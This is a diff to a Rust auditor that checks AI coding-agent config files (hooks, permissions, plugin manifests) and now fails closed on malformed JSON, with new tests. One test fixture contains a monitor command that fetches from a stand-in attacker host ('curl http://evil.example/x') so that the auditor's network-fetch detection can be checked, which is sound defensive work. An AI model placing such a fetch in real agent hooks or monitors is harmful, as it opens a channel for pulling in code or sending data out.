@@ -73,16 +73,25 @@ pub fn run_config_audit_command(
     };
 
     let mut findings = Vec::new();
-    if let Some(document) = read_json(&repository_root.join(".claude").join("hooks.json")) {
-        audit_hooks_doc(&document, &mut findings);
-    }
-    if let Some(document) = read_json(&repository_root.join(".claude").join("settings.json")) {
-        audit_settings_doc(&document, &mut findings);
-    }
+    audit_json_file(
+        &repository_root.join(".claude").join("hooks.json"),
+        "hooks.json",
+        audit_hooks_doc,
+        &mut findings,
+    );
+    audit_json_file(
+        &repository_root.join(".claude").join("settings.json"),
+        "settings.json",
+        audit_settings_doc,
+        &mut findings,
+    );
     audit_local_settings_tracking(&repository_root, &mut findings);
-    if let Some(document) = read_json(&repository_root.join(".claude-plugin").join("plugin.json")) {
-        audit_manifest_doc(&document, &mut findings);
-    }
+    audit_json_file(
+        &repository_root.join(".claude-plugin").join("plugin.json"),
+        "plugin.json",
+        audit_manifest_doc,
+        &mut findings,
+    );
 
     let high = findings
         .iter()
@@ -153,26 +162,104 @@ fn finding_to_value(finding: &Finding) -> Value {
     ])
 }
 
+type JsonAuditor = fn(&JsonValue, &mut Vec<Finding>);
+
+/// Read one optional config surface and fail closed when it exists but cannot
+/// be parsed or has a shape this auditor cannot inspect. Missing optional
+/// surfaces remain a clean no-op; an existing unreadable file must never look
+/// like an audited, clean file.
+fn audit_json_file(path: &Path, surface: &str, audit: JsonAuditor, findings: &mut Vec<Finding>) {
+    match read_json(path) {
+        Ok(Some(document)) => {
+            if !document.is_object() {
+                push_schema_finding(
+                    findings,
+                    surface,
+                    "config root must be a JSON object; the audit cannot inspect it",
+                );
+            } else {
+                audit(&document, findings);
+            }
+        }
+        Ok(None) => {}
+        Err(error) => findings.push(Finding {
+            severity: Severity::High,
+            surface: surface.to_string(),
+            message: format!("config exists but could not be audited: {error}"),
+        }),
+    }
+}
+
+fn push_schema_finding(findings: &mut Vec<Finding>, surface: &str, message: &str) {
+    findings.push(Finding {
+        severity: Severity::High,
+        surface: surface.to_string(),
+        message: format!("unsupported config shape: {message}"),
+    });
+}
+
 /// Audit a `hooks.json` document. Hook commands are arbitrary shell the agent
 /// runs, so shell metacharacters (injection), network fetches (exfiltration),
 /// and non-managed commands are flagged.
 fn audit_hooks_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
-    let Some(hooks) = document.get("hooks").and_then(JsonValue::as_object) else {
+    let Some(hooks_value) = document.get("hooks") else {
+        return;
+    };
+    let Some(hooks) = hooks_value.as_object() else {
+        push_schema_finding(
+            findings,
+            "hooks.json:hooks",
+            "hooks must be a JSON object; the audit cannot inspect hook commands",
+        );
         return;
     };
     for (event_name, entries) in hooks {
         let Some(entries) = entries.as_array() else {
+            push_schema_finding(
+                findings,
+                &format!("hooks.json:hooks.{event_name}"),
+                "hook event entries must be a JSON array; the audit cannot inspect commands",
+            );
             continue;
         };
         for entry in entries {
-            let Some(commands) = entry.get("hooks").and_then(JsonValue::as_array) else {
+            let Some(entry) = entry.as_object() else {
+                push_schema_finding(
+                    findings,
+                    &format!("hooks.json:hooks.{event_name}"),
+                    "hook event entries must be JSON objects; the audit cannot inspect commands",
+                );
+                continue;
+            };
+            let Some(commands_value) = entry.get("hooks") else {
+                continue;
+            };
+            let Some(commands) = commands_value.as_array() else {
+                push_schema_finding(
+                    findings,
+                    &format!("hooks.json:hooks.{event_name}.hooks"),
+                    "hook commands must be a JSON array; the audit cannot inspect commands",
+                );
                 continue;
             };
             for command_entry in commands {
-                let command = command_entry
-                    .get("command")
-                    .and_then(JsonValue::as_str)
-                    .unwrap_or_default();
+                let Some(command_entry) = command_entry.as_object() else {
+                    push_schema_finding(
+                        findings,
+                        &format!("hooks.json:hooks.{event_name}.hooks"),
+                        "hook command entries must be JSON objects; the audit cannot inspect the command",
+                    );
+                    continue;
+                };
+                let command = command_entry.get("command").and_then(JsonValue::as_str);
+                let Some(command) = command else {
+                    push_schema_finding(
+                        findings,
+                        &format!("hooks.json:hooks.{event_name}.hooks.command"),
+                        "hook command must be a JSON string; the audit cannot inspect it",
+                    );
+                    continue;
+                };
                 if contains_shell_metacharacters(command) {
                     findings.push(Finding {
                         severity: Severity::High,
@@ -224,6 +311,34 @@ fn audit_hooks_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
 
 /// Audit a `settings.json` document for over-broad or dangerous permission grants.
 fn audit_settings_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
+    if let Some(permissions) = document.get("permissions") {
+        let Some(permissions) = permissions.as_object() else {
+            push_schema_finding(
+                findings,
+                "settings.json:permissions",
+                "permissions must be a JSON object; the audit cannot inspect permission grants",
+            );
+            return;
+        };
+        if let Some(allow) = permissions.get("allow") {
+            if !allow.is_array() {
+                push_schema_finding(
+                    findings,
+                    "settings.json:permissions.allow",
+                    "permissions.allow must be a JSON array; the audit cannot inspect allow rules",
+                );
+            }
+        }
+        if let Some(additional_directories) = permissions.get("additionalDirectories") {
+            if !additional_directories.is_array() {
+                push_schema_finding(
+                    findings,
+                    "settings.json:permissions.additionalDirectories",
+                    "permissions.additionalDirectories must be a JSON array; the audit cannot inspect filesystem grants",
+                );
+            }
+        }
+    }
     let default_mode = document
         .get("permissions")
         .and_then(|permissions| permissions.get("defaultMode"))
@@ -244,7 +359,14 @@ fn audit_settings_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
         .and_then(JsonValue::as_array)
     {
         for rule in allow {
-            let rule_text = rule.as_str().unwrap_or_default();
+            let Some(rule_text) = rule.as_str() else {
+                push_schema_finding(
+                    findings,
+                    "settings.json:permissions.allow",
+                    "allow rules must be JSON strings; the audit cannot inspect this rule",
+                );
+                continue;
+            };
             if rule_text == "Bash" || rule_text == "Bash(*)" || rule_text == "Bash(*:*)" {
                 findings.push(Finding {
                     severity: Severity::High,
@@ -337,7 +459,14 @@ fn audit_settings_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
         .and_then(JsonValue::as_array)
     {
         for dir in dirs {
-            let dir_text = dir.as_str().unwrap_or_default();
+            let Some(dir_text) = dir.as_str() else {
+                push_schema_finding(
+                    findings,
+                    "settings.json:permissions.additionalDirectories",
+                    "additionalDirectories entries must be JSON strings; the audit cannot inspect this path",
+                );
+                continue;
+            };
             if reaches_outside_workspace(dir_text) {
                 findings.push(Finding {
                     severity: Severity::Medium,
@@ -461,6 +590,52 @@ fn is_unscoped_sensitive_allow(rule_text: &str) -> bool {
 /// committed secret literals, and for servers wired to a remote network URL
 /// (a supply-chain/exfiltration surface the agent talks to on every session).
 fn audit_manifest_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
+    if let Some(servers) = document.get("mcpServers") {
+        if let Some(servers) = servers.as_object() {
+            for (server_name, server) in servers {
+                if !server.is_object() {
+                    push_schema_finding(
+                        findings,
+                        &format!("plugin.json:mcpServers.{server_name}"),
+                        "MCP server entries must be JSON objects; the audit cannot inspect their command, endpoint, or env",
+                    );
+                } else if let Some(env) = server.get("env") {
+                    if !env.is_object() {
+                        push_schema_finding(
+                            findings,
+                            &format!("plugin.json:mcpServers.{server_name}.env"),
+                            "MCP server env must be a JSON object; the audit cannot inspect its values",
+                        );
+                    }
+                }
+            }
+        } else {
+            push_schema_finding(
+                findings,
+                "plugin.json:mcpServers",
+                "mcpServers must be a JSON object; the audit cannot inspect server endpoints",
+            );
+        }
+    }
+    if let Some(experimental) = document.get("experimental") {
+        let Some(experimental) = experimental.as_object() else {
+            push_schema_finding(
+                findings,
+                "plugin.json:experimental",
+                "experimental must be a JSON object; the audit cannot inspect monitor commands",
+            );
+            return;
+        };
+        if let Some(monitors) = experimental.get("monitors") {
+            if !monitors.is_array() {
+                push_schema_finding(
+                    findings,
+                    "plugin.json:experimental.monitors",
+                    "experimental.monitors must be a JSON array; the audit cannot inspect monitor commands",
+                );
+            }
+        }
+    }
     // mcpServers is optional — a manifest with only experimental.monitors (and
     // no MCP servers) must still reach the monitors audit below, so do not
     // early-return here; skip the server loop instead.
@@ -487,7 +662,14 @@ fn audit_manifest_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
                 continue;
             };
             for (key, value) in env {
-                let value_text = value.as_str().unwrap_or_default();
+                let Some(value_text) = value.as_str() else {
+                    push_schema_finding(
+                        findings,
+                        &format!("plugin.json:mcpServers.{server_name}.env.{key}"),
+                        "MCP env values must be JSON strings; the audit cannot inspect this value",
+                    );
+                    continue;
+                };
                 if looks_like_secret_literal(value_text) {
                     findings.push(Finding {
                         severity: Severity::High,
@@ -512,14 +694,28 @@ fn audit_manifest_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
         return;
     };
     for monitor in monitors {
+        let Some(monitor) = monitor.as_object() else {
+            push_schema_finding(
+                findings,
+                "plugin.json:experimental.monitors",
+                "monitor entries must be JSON objects; the audit cannot inspect commands",
+            );
+            continue;
+        };
         let monitor_name = monitor
             .get("name")
             .and_then(JsonValue::as_str)
             .unwrap_or("unnamed");
-        let command = monitor
-            .get("command")
-            .and_then(JsonValue::as_str)
-            .unwrap_or_default();
+        let Some(command) = monitor.get("command").and_then(JsonValue::as_str) else {
+            if monitor.get("command").is_some() {
+                push_schema_finding(
+                    findings,
+                    &format!("plugin.json:experimental.monitors.{monitor_name}.command"),
+                    "monitor command must be a JSON string; the audit cannot inspect it",
+                );
+            }
+            continue;
+        };
         if command.is_empty() {
             continue;
         }
@@ -689,9 +885,15 @@ fn looks_like_secret_literal(value: &str) -> bool {
     prefixed || long_token
 }
 
-fn read_json(path: &Path) -> Option<JsonValue> {
-    let text = fs::read_to_string(path).ok()?;
-    serde_json::from_str(&text).ok()
+fn read_json(path: &Path) -> Result<Option<JsonValue>, String> {
+    let text = match fs::read_to_string(path) {
+        Ok(text) => text,
+        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
+        Err(error) => return Err(format!("read {}: {error}", path.display())),
+    };
+    serde_json::from_str(&text)
+        .map(Some)
+        .map_err(|error| format!("parse {}: {error}", path.display()))
 }
 
 /// Best-effort git-tracked check. Returns false when git is unavailable so the
@@ -1177,5 +1379,91 @@ mod tests {
         assert!(!reaches_outside_workspace("docs"));
         assert!(!reaches_outside_workspace("src/utility"));
         assert!(!reaches_outside_workspace(""));
+    }
+
+    #[test]
+    fn existing_malformed_json_is_not_treated_as_clean_or_missing() {
+        let directory = crate::test_support::unique_temp_dir("keel-config-audit-malformed");
+        let path = directory.join("settings.json");
+        fs::write(&path, "{\"permissions\":").expect("write malformed config");
+
+        let result = read_json(&path);
+
+        let error = result.expect_err("malformed existing config must fail closed");
+        assert!(error.contains("parse"), "unexpected error: {error}");
+    }
+
+    #[test]
+    fn non_object_config_root_is_reported_as_unsupported() {
+        let mut findings = Vec::new();
+        let directory = crate::test_support::unique_temp_dir("keel-config-audit-shape");
+        let path = directory.join("hooks.json");
+        fs::write(&path, "[]").expect("write unsupported config");
+
+        audit_json_file(&path, "hooks.json", audit_hooks_doc, &mut findings);
+
+        assert!(
+            findings.iter().any(|finding| {
+                finding.severity == Severity::High
+                    && finding.surface == "hooks.json"
+                    && finding.message.contains("unsupported config shape")
+            }),
+            "findings: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn malformed_known_sections_are_reported_without_hiding_other_sections() {
+        let mut findings = Vec::new();
+        let document: JsonValue = serde_json::from_str(
+            r#"{"mcpServers":[],"experimental":{"monitors":[{"name":"remote","command":"curl http://evil.example/x"}]}}"#,
+        )
+        .unwrap();
+
+        audit_manifest_doc(&document, &mut findings);
+
+        assert!(
+            findings.iter().any(|finding| {
+                finding.surface == "plugin.json:mcpServers"
+                    && finding.message.contains("unsupported config shape")
+            }),
+            "malformed mcpServers must be visible: {findings:?}"
+        );
+        assert!(
+            findings.iter().any(|finding| {
+                finding.surface.contains("experimental.monitors.remote")
+                    && finding.message.contains("network")
+            }),
+            "valid monitor findings must not be hidden: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn command_reports_malformed_existing_surface_and_fails_closed() {
+        let directory = crate::test_support::unique_temp_dir("keel-config-audit-command");
+        fs::create_dir_all(directory.join(".claude")).expect("claude directory");
+        fs::create_dir_all(directory.join(".claude-plugin")).expect("plugin directory");
+        fs::write(directory.join(".claude/hooks.json"), "not-json").expect("malformed hooks");
+        fs::write(directory.join(".claude-plugin/plugin.json"), "{}").expect("plugin");
+        let mut output = Vec::new();
+        let mut error = Vec::new();
+
+        let code = run_config_audit_command(
+            &[
+                "--repo-root".to_string(),
+                directory.to_string_lossy().to_string(),
+                "--json".to_string(),
+            ],
+            &mut output,
+            &mut error,
+        );
+
+        assert_eq!(code, 2, "malformed existing config must fail audit");
+        let rendered = String::from_utf8(output).expect("json output");
+        assert!(
+            rendered.contains("could not be audited"),
+            "output: {rendered}"
+        );
+        assert!(error.is_empty(), "unexpected stderr: {:?}", error);
     }
 }
